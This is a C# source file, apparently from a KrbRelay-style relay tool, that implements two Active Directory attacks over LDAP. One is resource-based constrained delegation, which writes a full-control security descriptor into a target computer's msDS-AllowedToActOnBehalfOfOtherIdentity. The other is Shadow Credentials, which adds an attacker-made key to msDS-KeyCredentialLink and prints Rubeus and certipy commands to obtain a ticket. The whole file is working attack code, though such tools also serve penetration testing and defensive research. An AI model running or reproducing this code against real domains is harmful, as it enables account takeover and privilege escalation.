using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using DSInternals.Common.Data;
using KrbRelay.Clients;

namespace KrbRelay.Clients.Attacks.Ldap
{
    /// <summary>
    /// Resource Based Constrained Delegation (CVE-2019-1040 style abuse) written against the managed
    /// LDAP client, so it works on both Windows and Linux. Writes
    /// msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer object.
    /// </summary>
    internal static class RbcdAttack
    {
        // CC|DC|LC|SW|RP|WP|DT|LO|CR|SD|RC|WD|WO  ==  0x000F01FF
        private const uint FullControlMask = 0x000F01FF;

        public static bool Attack(LdapRelayClient ldap, string baseDn, string targetComputer, string attackerIdentity)
        {
            LdapEntry target = ldap.FindObject(baseDn, targetComputer, new[] { "distinguishedName", "objectClass" }, out int resultCode, out string diagnostic);
            if (target == null)
            {
                Console.WriteLine("[-] rbcd: target computer '{0}' not found in {1} ({2}) {3}",
                    targetComputer, baseDn, LdapRelayClient.ResultText(resultCode), diagnostic);
                return false;
            }

            string attackerSid = attackerIdentity;
            if (!attackerSid.StartsWith("S-1-5-", StringComparison.OrdinalIgnoreCase))
            {
                LdapEntry principal = ldap.FindObject(baseDn, attackerIdentity, new[] { "objectSid" }, out resultCode, out diagnostic);
                if (principal == null || !principal.Attributes.TryGetValue("objectSid", out List<byte[]> sidValues) || sidValues.Count == 0)
                {
                    Console.WriteLine("[-] rbcd: could not resolve objectSid for '{0}' ({1}) {2}",
                        attackerIdentity, LdapRelayClient.ResultText(resultCode), diagnostic);
                    return false;
                }
                attackerSid = LdapRelayClient.BinarySidToString(sidValues[0]);
            }

            Console.WriteLine("[*] rbcd: granting {0} control over {1}", attackerSid, target.Dn);

            byte[] securityDescriptor = BuildSecurityDescriptor(attackerSid);
            resultCode = ldap.Modify(target.Dn, new List<LdapModification>
            {
                LdapModification.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", securityDescriptor)
            }, out diagnostic);

            if (resultCode != 0)
            {
                Console.WriteLine("[-] rbcd: modify failed: {0} ({1}) {2}", LdapRelayClient.ResultText(resultCode), resultCode, diagnostic);
                return false;
            }

            Console.WriteLine("[+] rbcd: msDS-AllowedToActOnBehalfOfOtherIdentity written on {0}", target.Dn);
            return true;
        }

        /// <summary>
        /// Builds a SECURITY_DESCRIPTOR_RELATIVE holding a single ACCESS_ALLOWED ACE (self relative,
        /// DACL present, no owner/group/SACL). Byte compatible with the SDDL
        /// "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-...)" used by the wldap32 version.
        /// </summary>
        public static byte[] BuildSecurityDescriptor(string sid)
        {
            byte[] sidBytes = LdapRelayClient.StringToBinarySid(sid);

            int aceSize = 4 + 4 + sidBytes.Length;
            byte[] ace = new byte[aceSize];
            ace[0] = 0x00;                                   // ACCESS_ALLOWED_ACE_TYPE
            ace[1] = 0x00;                                   // AceFlags
            WriteUInt16(ace, 2, (ushort)aceSize);
            WriteUInt32(ace, 4, FullControlMask);
            Buffer.BlockCopy(sidBytes, 0, ace, 8, sidBytes.Length);

            int aclSize = 8 + ace.Length;
            byte[] dacl = new byte[aclSize];
            dacl[0] = 0x02;                                  // ACL_REVISION
            dacl[1] = 0x00;
            WriteUInt16(dacl, 2, (ushort)aclSize);
            WriteUInt16(dacl, 4, 1);                         // AceCount
            WriteUInt16(dacl, 6, 0);
            Buffer.BlockCopy(ace, 0, dacl, 8, ace.Length);

            byte[] descriptor = new byte[20 + dacl.Length];
            descriptor[0] = 0x01;                            // Revision
            descriptor[1] = 0x00;                            // Sbz1
            WriteUInt16(descriptor, 2, 0x8004);              // SE_SELF_RELATIVE | SE_DACL_PRESENT
            WriteUInt32(descriptor, 4, 0);                   // OffsetOwner
            WriteUInt32(descriptor, 8, 0);                   // OffsetGroup
            WriteUInt32(descriptor, 12, 0);                  // OffsetSacl
            WriteUInt32(descriptor, 16, 20);                 // OffsetDacl
            Buffer.BlockCopy(dacl, 0, descriptor, 20, dacl.Length);

            return descriptor;
        }

        private static void WriteUInt16(byte[] buffer, int offset, ushort value)
        {
            buffer[offset] = (byte)(value & 0xFF);
            buffer[offset + 1] = (byte)((value >> 8) & 0xFF);
        }

        private static void WriteUInt32(byte[] buffer, int offset, uint value)
        {
            buffer[offset] = (byte)(value & 0xFF);
            buffer[offset + 1] = (byte)((value >> 8) & 0xFF);
            buffer[offset + 2] = (byte)((value >> 16) & 0xFF);
            buffer[offset + 3] = (byte)((value >> 24) & 0xFF);
        }
    }

    /// <summary>
    /// Shadow Credentials: adds a KeyCredential to msDS-KeyCredentialLink of the target account so an
    /// attacker controlled certificate can request a TGT for it. Managed implementation (no RSACng),
    /// so the key blob and the PKCS#12 export also work on Linux.
    /// </summary>
    internal static class ShadowCredentialAttack
    {
        public static bool Attack(LdapRelayClient ldap, string baseDn, string target)
        {
            LdapEntry entry = ldap.FindObject(baseDn, target, new[] { "distinguishedName", "objectClass" }, out int resultCode, out string diagnostic);
            if (entry == null)
            {
                Console.WriteLine("[-] shadowcred: object '{0}' not found in {1} ({2}) {3}",
                    target, baseDn, LdapRelayClient.ResultText(resultCode), diagnostic);
                return false;
            }

            bool isComputer = entry.GetStrings("objectClass").Any(value => value.Equals("computer", StringComparison.OrdinalIgnoreCase));

            using (RSA rsa = RSA.Create(2048))
            {
                CertificateRequest request = new CertificateRequest(
                    "CN=" + target, rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
                using (X509Certificate2 certificate = request.CreateSelfSigned(
                    DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddYears(1)))
                {
                    // Computer keys are DER encoded, user keys are BCRYPT_RSAKEY_BLOB (same split as DSInternals).
                    byte[] keyMaterial = isComputer
                        ? rsa.ExportRSAPublicKey()
                        : BuildBCryptRsaPublicBlob(rsa.ExportParameters(false));

                    KeyCredential keyCredential = new KeyCredential(
                        keyMaterial, Guid.NewGuid(), entry.Dn, DateTime.UtcNow, isComputer);

                    string dnWithBinary = keyCredential.ToDNWithBinary();
                    Console.WriteLine("[*] shadowcred: writing KeyCredential on {0} ({1} account)", entry.Dn, isComputer ? "computer" : "user");

                    resultCode = ldap.Modify(entry.Dn, new List<LdapModification>
                    {
                        LdapModification.Add("msDS-KeyCredentialLink", Encoding.ASCII.GetBytes(dnWithBinary))
                    }, out diagnostic);

                    if (resultCode != 0)
                    {
                        Console.WriteLine("[-] shadowcred: modify failed: {0} ({1}) {2}", LdapRelayClient.ResultText(resultCode), resultCode, diagnostic);
                        return false;
                    }

                    string password = Guid.NewGuid().ToString();
                    string pfx = Convert.ToBase64String(certificate.Export(X509ContentType.Pfx, password));

                    Console.WriteLine("[+] shadowcred: msDS-KeyCredentialLink written on {0}", entry.Dn);
                    Console.WriteLine("    Rubeus.exe asktgt /user:{0} /certificate:{1} /password:\"{2}\" /getcredentials /show", target, pfx, password);
                    Console.WriteLine("    (Linux: save the base64 as pfx.b64, base64 -d > pfx.pfx, then certipy auth -pfx pfx.pfx -dc-ip <dc>)");
                    return true;
                }
            }
        }

        /// <summary>BCRYPT_RSAKEY_BLOB (BCRYPT_RSAPUBLIC_MAGIC) built from RSAParameters.</summary>
        private static byte[] BuildBCryptRsaPublicBlob(RSAParameters parameters)
        {
            using (MemoryStream stream = new MemoryStream())
            using (BinaryWriter writer = new BinaryWriter(stream))
            {
                writer.Write(0x31415352);                              // 'RSA1'
                writer.Write((uint)(parameters.Modulus.Length * 8));    // BitLength
                writer.Write((uint)parameters.Exponent.Length);         // cbPublicExp
                writer.Write((uint)parameters.Modulus.Length);          // cbModulus
                writer.Write(parameters.Exponent);
                writer.Write(parameters.Modulus);
                writer.Flush();
                return stream.ToArray();
            }
        }
    }
}
